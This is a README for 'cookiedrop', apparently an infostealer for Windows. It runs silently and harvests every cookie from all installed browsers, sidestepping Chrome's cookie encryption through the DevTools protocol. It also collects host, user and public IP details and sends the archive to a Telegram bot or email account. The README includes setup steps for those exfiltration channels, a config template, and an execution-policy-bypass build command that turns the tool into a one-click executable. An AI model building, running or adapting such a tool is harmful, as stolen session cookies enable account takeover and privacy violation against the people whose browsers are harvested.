# cookiedrop

Unzip on a Windows machine, double-click, cookies arrive on your phone and/or inbox.
No Python, no admin, no pairing, no console window. Works from any network with outbound
HTTPS.

## Why it needs no decryption

Chromium browsers are launched with a DevTools port and cookies are pulled through
`Network.getAllCookies`. The browser hands over plaintext, so DPAPI, AES-GCM and Chrome
127+ App-Bound Encryption are all bypassed rather than defeated. Firefox databases are
copied as-is because Firefox does not encrypt cookie values.

## Setup

### 1. Telegram (recommended, 2 minutes)

1. Message `@BotFather`, send `/newbot`, pick a name, copy the token.
2. Send your new bot any message.
3. Open `https://api.telegram.org/bot<TOKEN>/getUpdates` and copy `result[0].message.chat.id`.

### 2. Email (optional, Brevo free tier)

Sign up at brevo.com, then Settings -> SMTP & API -> API Keys -> create. Use the signup
address for both `to` and `from`; unverified senders are rejected.

### 3. Configure

Copy `config.example.json` to `config.json` and fill in whichever channels you set up.
At least one must be populated.

```json
{
  "telegram": { "token": "123:ABC", "chat_id": "123456789" },
  "email": { "enabled": true, "api_key": "xkeysib-...", "to": "you@example.com", "from": "you@example.com" },
  "browsers": ["chrome", "edge", "brave", "vivaldi", "opera", "firefox"],
  "close_browsers": true,
  "debug_port": 9333,
  "keep_local_copy": true
}
```

`config.json` is gitignored because it holds live credentials. `RUN.bat` refuses to start
without it, and stops on screen if the harvest throws, so you are never staring at a
silent no-op.

### 4. Run

Double-click `RUN.bat`. Silent, 15-40 seconds.

### 5. Optional: single-file build

```powershell
powershell -NoP -Exec Bypass -File .\build-sfx.ps1
```

Produces `CookieDrop.exe`: one double-click, extracts to temp, runs, exits. IExpress shows a
brief extract window and SmartScreen warns once on unsigned binaries. Use `RUN.bat` if that
bothers you. `config.json` must exist before you build.

## What it does

Kills listed browsers (only if `close_browsers`, Firefox included), walks every profile of
every installed browser, collects cookies, copies Firefox databases, records
hostname/user/OS/local and public IP, zips it all, sends to each configured channel with
three independent retries, and keeps a copy at `%LOCALAPPDATA%\CookieDrop`.

## Limits

- Browsers must be closable. `close_browsers: true` costs the user their tabs.
- Captive portals and locked-down proxies block both channels; the local copy is the only
  recovery path there.
- Telegram caps at 50 MB, Brevo attachments at 10 MB. A heavy multi-browser profile reaches
  a few MB.
- Unsigned exe, SmartScreen will warn.

## License

MIT, see `../LICENSE`.